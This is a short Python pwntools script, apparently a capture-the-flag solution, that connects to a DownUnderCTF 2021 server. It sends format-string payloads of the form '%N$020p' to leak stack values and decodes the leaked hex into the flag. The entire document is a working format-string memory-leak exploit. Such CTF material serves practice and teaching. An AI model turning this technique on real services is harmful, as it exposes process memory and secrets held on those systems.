from pwn import *
from binascii import unhexlify
import re

r = remote('pwn-2021.duc.tf',31918)

print(r.recvline())

flag = ''
for i in range(1, 20):
    r.sendline(f'%{i}$020p'.encode())

    while True:
        text = r.recv()
        if 'nil' in str(text):
            break
        try:
            text = re.findall('0x(\w*)\n\n', text.decode())[0]
        except:
            continue
       
        print(unhexlify(text)[::-1])
        break
